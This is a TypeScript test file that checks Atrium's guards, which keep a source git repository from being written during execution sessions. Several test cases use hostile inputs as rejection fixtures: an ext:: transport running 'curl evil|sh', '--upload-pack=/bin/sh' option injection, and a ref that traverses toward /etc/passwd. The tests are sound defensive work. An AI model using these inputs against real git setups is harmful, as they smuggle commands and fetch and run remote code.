import { execFile } from 'node:child_process';
import { mkdtemp, readFile, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { promisify } from 'node:util';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { loadEnv } from '../../src/env.js';
import { executionUpstream } from '../../src/execution/configure.js';
import {
  ARTIFACT_REPO_AT_UPSTREAM_REFUSAL,
  type ArtifactRepo,
  addWorktree,
  commitWorktree,
  createArtifactRepo,
  createScratchRepo,
  disposeScratchRepo,
  mainCommit,
  PUSH_INTO_UPSTREAM_REFUSAL,
  pushArtifactBranch,
  removeWorktree,
  type ScratchRepo,
  UPSTREAM_ARTIFACT_REMOTE_REFUSAL,
} from '../../src/execution/git.js';
import { createDeterministicShimProvider } from '../../src/execution/shim.js';
import { UPSTREAM_REF_REFUSAL, UPSTREAM_URL_REFUSAL } from '../../src/execution/upstream.js';
import { createWorktreeCommandProvider } from '../../src/execution/worktree-provider.js';

/**
 * REAL-REPO EXECUTION MODE (#141) — the guard witnesses.
 *
 * The headline invariant is ONE sentence — THE UPSTREAM IS NEVER WRITTEN — and
 * it is enforced at three layers, because a guard present on one layer and
 * absent on the adjacent one is the #89 adjacent-path-bypass class:
 *
 *   config    `env.ts`               → the dangerous wiring will not BOOT
 *   plumbing  `git.ts`/`upstream.ts` → the dangerous OPERATION refuses
 *   provider  `shim`/`worktree`      → the dangerous PROVIDER will not BUILD
 *
 * ## Why the disjointness table exists
 *
 * The campaign's recurring defect is not a missing guard, it is a SHARED
 * REFUSAL SENTENCE: two guards throw messages that both satisfy one witness's
 * regex, so the witness passes with guard B reverted because guard A caught the
 * fixture instead. It has fired four times. So every refusal in this seam gets
 * its own sentence, and `GUARDS` below is checked two ways — pairwise disjoint
 * as strings, and each fixture's thrown message matches EXACTLY ONE probe.
 * Revert any single guard and its case reds on "expected a throw", never on
 * somebody else's message.
 */

const run = promisify(execFile);

/** A real git repo with a known file — the stand-in for "this repo". */
async function makeUpstream(file = 'KEEP.txt', body = 'the file a session deletes\n') {
  const dir = await mkdtemp(join(tmpdir(), 'atrium-upstream-'));
  await run('git', ['init', '-q', '-b', 'main'], { cwd: dir });
  await writeFile(join(dir, file), body);
  await writeFile(join(dir, 'untouched.txt'), 'stays exactly as it is\n');
  await run('git', ['add', '-A'], { cwd: dir });
  await run(
    'git',
    ['-c', 'user.name=up', '-c', 'user.email=up@up', 'commit', '-q', '-m', 'upstream seed'],
    { cwd: dir },
  );
  const { stdout } = await run('git', ['rev-parse', 'HEAD'], { cwd: dir });
  return { dir, commit: stdout.trim(), file };
}

/**
 * A content hash of every file under `dir` — the byte-identity measure the
 * invariant is stated in. Paths AND contents, sorted, so a new file, a deleted
 * file, or a changed byte all move it.
 */
async function fingerprint(dir: string): Promise<string> {
  const { stdout } = await run('bash', [
    '-c',
    `cd ${JSON.stringify(dir)} && find . -type f -print0 | LC_ALL=C sort -z | xargs -0 sha256sum | sha256sum`,
  ]);
  return stdout.trim();
}

/* ═══════════════════════════════════════════════════════════════════════════
 * THE DISJOINTNESS TABLE — one row per guard, one probe per row.
 * ═══════════════════════════════════════════════════════════════════════════ */

interface Guard {
  readonly id: string;
  readonly layer: 'config' | 'plumbing' | 'provider';
  /** A fragment that appears in THIS guard's refusal and no other's. */
  readonly probe: RegExp;
}

const GUARDS: readonly Guard[] = [
  { id: 'config/url-missing', layer: 'config', probe: /reads as live and does nothing/ },
  { id: 'config/ref-missing', layer: 'config', probe: /will not guess which commit/ },
  { id: 'config/wrong-provider', layer: 'config', probe: /would be silently inert/ },
  { id: 'config/url-shape', layer: 'config', probe: /is not a repository and is refused/ },
  {
    id: 'config/write-overlap',
    layer: 'config',
    probe: /refused at boot rather than discovered afterwards/,
  },
  {
    id: 'plumbing/ref-shape',
    layer: 'plumbing',
    probe: /not a well-formed, option-free git ref name/,
  },
  {
    id: 'plumbing/url-as-option',
    layer: 'plumbing',
    probe: /resolve as a flag, an ext:: transport/,
  },
  {
    id: 'plumbing/artifact-repo-at-upstream',
    layer: 'plumbing',
    probe: /would modify the very repository a session forks from/,
  },
  {
    id: 'plumbing/push-into-upstream',
    layer: 'plumbing',
    probe: /a human FETCHES from the provider-owned repo/,
  },
  {
    id: 'provider/artifact-remote',
    layer: 'provider',
    probe: /without a durable artifact remote distinct from the upstream/,
  },
];

/**
 * Assert a refusal is THIS guard's and nobody else's. The second half is the
 * anti-shared-sentence check: if another guard's message also matched, the
 * witness would be proving the wrong thing.
 */
function expectExactlyGuard(message: string, id: string): void {
  const matched = GUARDS.filter((guard) => guard.probe.test(message)).map((guard) => guard.id);
  expect(matched, `message did not match exactly one guard probe:\n${message}`).toEqual([id]);
}

describe('#141 refusal sentences are pairwise disjoint', () => {
  it("no guard probe matches another guard's shipped refusal string", () => {
    const shipped: Array<[string, string]> = [
      ['plumbing/ref-shape', UPSTREAM_REF_REFUSAL],
      ['plumbing/url-as-option', UPSTREAM_URL_REFUSAL],
      ['plumbing/artifact-repo-at-upstream', ARTIFACT_REPO_AT_UPSTREAM_REFUSAL],
      ['plumbing/push-into-upstream', PUSH_INTO_UPSTREAM_REFUSAL],
      ['provider/artifact-remote', UPSTREAM_ARTIFACT_REMOTE_REFUSAL],
    ];
    for (const [id, sentence] of shipped) expectExactlyGuard(sentence, id);
    // And no two shipped sentences are the same string, which is the trap in its
    // crudest form.
    const sentences = shipped.map(([, sentence]) => sentence);
    expect(new Set(sentences).size).toBe(sentences.length);
  });

  it('covers every layer the invariant is restated at', () => {
    expect(new Set(GUARDS.map((g) => g.layer))).toEqual(
      new Set(['config', 'plumbing', 'provider']),
    );
  });
});

/* ═══════════════════════════════════════════════════════════════════════════
 * LAYER 1 — CONFIG. The dangerous wiring does not boot.
 * ═══════════════════════════════════════════════════════════════════════════ */

describe('THE UPSTREAM IS NEVER WRITTEN — config layer (#141, red-on-revert)', () => {
  const BASE = {
    DATABASE_URL: 'postgres://atrium:atrium@localhost:5432/atrium',
    NODE_ENV: 'development',
  } as const;

  /** Load and capture the boot refusal, failing loudly if it booted instead. */
  function refusal(source: Record<string, string>): string {
    try {
      loadEnv(source);
    } catch (error) {
      return (error as Error).message;
    }
    return expect.unreachable('expected loadEnv to refuse this environment') as never;
  }

  it('refuses a REF with no URL to fetch it from', () => {
    // REVERT-REDS: delete the `url === undefined` arm of
    // `assertExecutionUpstreamSafe` and this boots with real-repo config that
    // does nothing at all.
    expectExactlyGuard(
      refusal({
        ...BASE,
        EXECUTION_PROVIDER: 'shim',
        EXECUTION_SCRATCH_DIR: '/tmp/atrium-scratch-141',
        EXECUTION_UPSTREAM_REF: 'main',
      }),
      'config/url-missing',
    );
  });

  it('refuses a URL with no REF, rather than defaulting to main', () => {
    // REVERT-REDS: give EXECUTION_UPSTREAM_REF a `.default('main')` and this
    // boots — and every session then produces a diff against a commit nobody
    // named, which is the plausible-and-wrong failure the ticket is about.
    expectExactlyGuard(
      refusal({
        ...BASE,
        EXECUTION_PROVIDER: 'shim',
        EXECUTION_SCRATCH_DIR: '/tmp/atrium-scratch-141',
        EXECUTION_UPSTREAM_URL: '/srv/atrium',
      }),
      'config/ref-missing',
    );
  });

  it('refuses an upstream under a provider that seeds no scratch trunk', () => {
    // REVERT-REDS: drop the provider check and the sandbox seam accepts an
    // upstream it never reads — configuration that looks live and is inert.
    expectExactlyGuard(
      refusal({
        ...BASE,
        EXECUTION_PROVIDER: 'sandbox',
        EXECUTION_UPSTREAM_URL: '/srv/atrium',
        EXECUTION_UPSTREAM_REF: 'main',
      }),
      'config/wrong-provider',
    );
  });

  it('refuses an upstream configured with execution DISABLED', () => {
    // The early-return hole: `EXECUTION_PROVIDER` unset used to short-circuit the
    // whole function, so real-repo config against a disabled provider sailed
    // through. REVERT-REDS: move `assertExecutionUpstreamSafe` back below the
    // `EXECUTION_PROVIDER === undefined` return and this boots silently.
    expectExactlyGuard(
      refusal({ ...BASE, EXECUTION_UPSTREAM_URL: '/srv/atrium', EXECUTION_UPSTREAM_REF: 'main' }),
      'config/wrong-provider',
    );
  });

  it.each([
    ['a leading dash git reads as a flag', '--upload-pack=/bin/sh'],
    ['an ext:: transport that names a command', 'ext::sh -c "curl evil|sh"'],
    ['a cwd-relative path', 'some/relative/repo'],
    ['an scp-style host:path', 'git@github.com:lmvdz/atrium.git'],
  ])('refuses %s as an upstream location', (_name, url) => {
    // REVERT-REDS: replace `isAcceptableUpstreamUrl`'s allowlist with a denylist
    // of the two forms someone remembered, and the other two board.
    expectExactlyGuard(
      refusal({
        ...BASE,
        EXECUTION_PROVIDER: 'shim',
        EXECUTION_SCRATCH_DIR: '/tmp/atrium-scratch-141',
        EXECUTION_UPSTREAM_URL: url,
        EXECUTION_UPSTREAM_REF: 'main',
      }),
      'config/url-shape',
    );
  });

  it.each([
    ['the scratch dir IS the upstream', 'EXECUTION_SCRATCH_DIR', '/srv/atrium'],
    ['the scratch dir is INSIDE the upstream', 'EXECUTION_SCRATCH_DIR', '/srv/atrium/.atrium'],
    ['the artifact dir IS the upstream', 'EXECUTION_ARTIFACT_DIR', '/srv/atrium'],
    ['the artifact dir is INSIDE the upstream', 'EXECUTION_ARTIFACT_DIR', '/srv/atrium/.git/x'],
    ['the upstream is inside the scratch dir', 'EXECUTION_SCRATCH_DIR', '/srv'],
    ['an unnormalised spelling of the same dir', 'EXECUTION_SCRATCH_DIR', '/srv/other/../atrium'],
  ])('refuses at boot when %s', (_name, key, value) => {
    // REVERT-REDS: weaken `pathsOverlap` to `left === right` and the four
    // containment cases board — an artifact repo INSIDE the upstream writes it
    // just as surely as one AT it.
    expectExactlyGuard(
      refusal({
        ...BASE,
        EXECUTION_PROVIDER: 'shim',
        EXECUTION_SCRATCH_DIR: '/tmp/atrium-scratch-141',
        EXECUTION_UPSTREAM_URL: '/srv/atrium',
        EXECUTION_UPSTREAM_REF: 'main',
        [key]: value,
      }),
      'config/write-overlap',
    );
  });

  it('accepts a well-formed, non-overlapping real-repo configuration', () => {
    const env = loadEnv({
      ...BASE,
      EXECUTION_PROVIDER: 'shim',
      EXECUTION_SCRATCH_DIR: '/tmp/atrium-scratch-141',
      EXECUTION_ARTIFACT_DIR: '/tmp/atrium-artifacts-141',
      EXECUTION_UPSTREAM_URL: '/srv/atrium',
      EXECUTION_UPSTREAM_REF: 'main',
    });
    expect(executionUpstream(env)).toEqual({ url: '/srv/atrium', ref: 'main' });
  });

  it('reads NO upstream when neither half is set — the unchanged #120 seam', () => {
    const env = loadEnv({
      ...BASE,
      EXECUTION_PROVIDER: 'shim',
      EXECUTION_SCRATCH_DIR: '/tmp/atrium-scratch-141',
    });
    expect(executionUpstream(env)).toBeUndefined();
  });
});

/* ═══════════════════════════════════════════════════════════════════════════
 * LAYER 2 — PLUMBING. The dangerous operation refuses.
 * ═══════════════════════════════════════════════════════════════════════════ */

describe('THE UPSTREAM IS NEVER WRITTEN — git plumbing (#141, red-on-revert)', () => {
  let upstream: Awaited<ReturnType<typeof makeUpstream>>;
  const trash: string[] = [];

  beforeEach(async () => {
    upstream = await makeUpstream();
    trash.push(upstream.dir);
  });
  afterEach(async () => {
    while (trash.length > 0) {
      const dir = trash.pop();
      if (dir) await rm(dir, { recursive: true, force: true });
    }
  });

  it.each([
    ['an option', '--upload-pack=/bin/sh'],
    ['a refspec that writes a second local ref', 'main:refs/heads/evil'],
    ['a path traversal', 'refs/../../etc/passwd'],
    ['a whitespace-carrying value', 'main branch'],
    ['a .lock suffix git itself rejects', 'main.lock'],
  ])('refuses a seed whose ref is %s', async (_name, ref) => {
    // The seed is validated on the ONLY path that fetches, so a hand-built seed
    // gets the operator's refusal. REVERT-REDS: drop `assertUpstreamSeed` from
    // `createScratchRepo` and `--upload-pack=` reaches git's argv.
    const error = await createScratchRepo(undefined, { url: upstream.dir, ref }).then(
      (repo) => {
        trash.push(repo.dir);
        return null;
      },
      (e: Error) => e,
    );
    expect(error, `expected createScratchRepo to refuse ref ${ref}`).not.toBeNull();
    expectExactlyGuard((error as Error).message, 'plumbing/ref-shape');
  });

  it.each([
    ['a flag', '--upload-pack=/bin/sh'],
    ['an ext:: transport', 'ext::sh -c evil'],
    ['a relative path', 'relative/repo'],
  ])('refuses a seed whose location is %s', async (_name, url) => {
    // REVERT-REDS: remove the url arm of `assertUpstreamSeed` and the `--`
    // separator is the only thing left; drop that too and `--upload-pack` runs.
    const error = await createScratchRepo(undefined, { url, ref: 'main' }).then(
      (repo) => {
        trash.push(repo.dir);
        return null;
      },
      (e: Error) => e,
    );
    expect(error, `expected createScratchRepo to refuse url ${url}`).not.toBeNull();
    expectExactlyGuard((error as Error).message, 'plumbing/url-as-option');
  });

  it.each([
    ['AT the upstream', (dir: string) => dir],
    ['INSIDE the upstream', (dir: string) => join(dir, '.git', 'atrium-artifacts')],
    ['a parent OF the upstream', (dir: string) => join(dir, '..')],
  ])('refuses to open the durable artifact repo %s', async (_name, where) => {
    const before = await fingerprint(upstream.dir);
    // REVERT-REDS: drop the overlap check from `createArtifactRepo` and this
    // runs `init --bare` + two `config` writes against a real repository — a
    // BOOT-time write, before any session exists.
    const error = await createArtifactRepo(where(upstream.dir), {
      url: upstream.dir,
      ref: 'main',
    }).then(
      () => null,
      (e: Error) => e,
    );
    expect(error).not.toBeNull();
    expectExactlyGuard((error as Error).message, 'plumbing/artifact-repo-at-upstream');
    // Nothing was written on the way to refusing.
    expect(await fingerprint(upstream.dir)).toBe(before);
  });

  it('refuses to push a session branch into the upstream, even from a hand-built repo', async () => {
    // `createArtifactRepo` already refuses to BUILD such a repo — which is
    // exactly why the push re-checks. `ArtifactRepo` is a plain object; this is
    // the adjacent path a caller reaches without passing any boot gate.
    const scratch = await createScratchRepo(undefined, { url: upstream.dir, ref: 'main' });
    trash.push(scratch.dir);
    const checkout = await addWorktree(scratch, 'push-into-upstream');
    await writeFile(join(checkout.dir, 'session.txt'), 'work\n');
    await commitWorktree(checkout, 'session work');

    const before = await fingerprint(upstream.dir);
    const forged: ArtifactRepo = { dir: upstream.dir, upstreamPath: upstream.dir };
    // REVERT-REDS: remove the overlap check from `pushArtifactBranch` and this
    // push SUCCEEDS — `refs/heads/atrium/session/push-into-upstream` appears in
    // the human's repository and the fingerprint moves.
    await expect(pushArtifactBranch(checkout, forged)).rejects.toThrow(
      /a human FETCHES from the provider-owned repo/,
    );
    const message = await pushArtifactBranch(checkout, forged).catch((e: Error) => e.message);
    expectExactlyGuard(message as string, 'plumbing/push-into-upstream');
    expect(await fingerprint(upstream.dir)).toBe(before);

    await removeWorktree(checkout);
    await disposeScratchRepo(scratch);
  });

  it('seeds trunk FROM the upstream and leaves it byte-identical', async () => {
    const before = await fingerprint(upstream.dir);
    const scratch = await createScratchRepo(undefined, { url: upstream.dir, ref: 'main' });
    trash.push(scratch.dir);

    // Trunk IS the upstream commit — not a synthetic seed.
    expect(scratch.seedCommit).toBe(upstream.commit);
    expect(await mainCommit(scratch)).toBe(upstream.commit);
    expect(scratch.upstream).toEqual({ url: upstream.dir, ref: 'main', commit: upstream.commit });

    // A worktree forks the REAL tree: the upstream's file is there to be edited.
    const checkout = await addWorktree(scratch, 'seeded');
    expect(await readFile(join(checkout.dir, upstream.file), 'utf8')).toContain(
      'the file a session deletes',
    );
    // REVERT-REDS: restore `createScratchRepo` to always write README.atrium and
    // the upstream file is absent here — the ticket's whole complaint.
    await removeWorktree(checkout);
    expect(await fingerprint(upstream.dir)).toBe(before);
    await disposeScratchRepo(scratch);
  });

  it('leaves the empty-trunk seam EXACTLY as it was when no upstream is given (the flip)', async () => {
    const scratch = await createScratchRepo();
    trash.push(scratch.dir);
    expect(scratch.upstream).toBeUndefined();
    const checkout = await addWorktree(scratch, 'unseeded');
    expect(await readFile(join(checkout.dir, 'README.atrium'), 'utf8')).toContain(
      'Atrium execution scratch repo',
    );
    await removeWorktree(checkout);
    await disposeScratchRepo(scratch);
  });
});

/* ═══════════════════════════════════════════════════════════════════════════
 * LAYER 3 — PROVIDER. The dangerous provider does not build.
 * ═══════════════════════════════════════════════════════════════════════════ */

describe('THE UPSTREAM IS NEVER WRITTEN — provider wiring (#141, red-on-revert)', () => {
  let upstream: Awaited<ReturnType<typeof makeUpstream>>;
  let seeded: ScratchRepo;
  let plain: ScratchRepo;
  let artifactDir: string;
  let artifactRepo: ArtifactRepo;
  let savedOptIn: string | undefined;

  beforeEach(async () => {
    upstream = await makeUpstream();
    seeded = await createScratchRepo(undefined, { url: upstream.dir, ref: 'main' });
    plain = await createScratchRepo();
    artifactDir = await mkdtemp(join(tmpdir(), 'atrium-artifacts-141-'));
    artifactRepo = await createArtifactRepo(artifactDir, { url: upstream.dir, ref: 'main' });
    savedOptIn = process.env.EXECUTION_ALLOW_UNSANDBOXED;
    process.env.EXECUTION_ALLOW_UNSANDBOXED = '1';
  });

  afterEach(async () => {
    if (savedOptIn === undefined) delete process.env.EXECUTION_ALLOW_UNSANDBOXED;
    else process.env.EXECUTION_ALLOW_UNSANDBOXED = savedOptIn;
    await disposeScratchRepo(seeded);
    await disposeScratchRepo(plain);
    await rm(artifactDir, { recursive: true, force: true });
    await rm(upstream.dir, { recursive: true, force: true });
  });

  /**
   * BOTH providers, because the obligation belongs to the SCRATCH REPO, not to
   * one adapter. A guard wired into `worktree` alone would leave `shim` — the
   * DEFAULT provider — building the exact configuration it forbids.
   */
  const factories: Array<[string, (repo: ScratchRepo, ar?: ArtifactRepo) => unknown]> = [
    ['shim', (repo, ar) => createDeterministicShimProvider({ repo, artifactRepo: ar })],
    [
      'worktree',
      (repo, ar) => createWorktreeCommandProvider({ repo, artifactRepo: ar, command: ['true'] }),
    ],
  ];

  for (const [kind, build] of factories) {
    it(`the ${kind} provider refuses an upstream-seeded repo with NO durable artifact remote`, () => {
      // Without a durable remote the artifact's `remote` falls back to the
      // scratch repo, which teardown deletes — a real-repo receipt naming a
      // remote nobody can fetch from. REVERT-REDS: remove
      // `assertArtifactRemoteIsNotUpstream` from this factory and it builds.
      let message = '';
      try {
        build(seeded, undefined);
        expect.unreachable(`${kind} must refuse a seeded repo with no artifact remote`);
      } catch (error) {
        message = (error as Error).message;
      }
      expectExactlyGuard(message, 'provider/artifact-remote');
    });

    it(`the ${kind} provider refuses a durable artifact remote that IS the upstream`, () => {
      let message = '';
      try {
        build(seeded, { dir: upstream.dir, upstreamPath: upstream.dir });
        expect.unreachable(`${kind} must refuse an artifact remote at the upstream`);
      } catch (error) {
        message = (error as Error).message;
      }
      expectExactlyGuard(message, 'provider/artifact-remote');
    });

    it(`the ${kind} provider builds normally with a distinct durable remote`, () => {
      expect(() => build(seeded, artifactRepo)).not.toThrow();
    });

    it(`the ${kind} provider is UNCHANGED for an unseeded repo with no artifact remote`, () => {
      // The flip: no upstream, no obligation. #120's behaviour is untouched.
      expect(() => build(plain, undefined)).not.toThrow();
    });
  }
});
